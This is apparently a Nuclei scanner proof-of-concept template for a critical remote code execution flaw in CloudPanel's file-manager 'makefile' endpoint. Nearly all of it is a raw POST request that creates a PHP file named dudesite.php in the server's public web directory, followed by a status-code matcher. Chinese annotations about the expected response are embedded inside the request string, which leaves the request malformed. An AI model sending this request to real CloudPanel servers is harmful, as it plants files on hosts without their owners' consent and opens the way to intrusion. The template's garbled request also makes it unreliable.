id: poc-ohmuyd6bp10g5oec
info:
  name: CloudPanel makefile接口存在远程命令执行漏洞
  author: hacktwo
  severity: critical
  description: ''
  tags: rce,2024
http:
- raw:
  - 'POST /file-manager/backend/makefile HTTP/1.1


    Accept-Encoding: gzip, deflate


    Accept: */*


    Connection: close


    Cookie: clp-


    Content-Type: application/x-www-form-urlencoded


    id=/htdocs/app/files/public/&name=dudesite.php


    # 响应代码特征

    200


    # 响应内容特征

    dudesite.php


    # 上传文件定位

    /dudesite.php'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
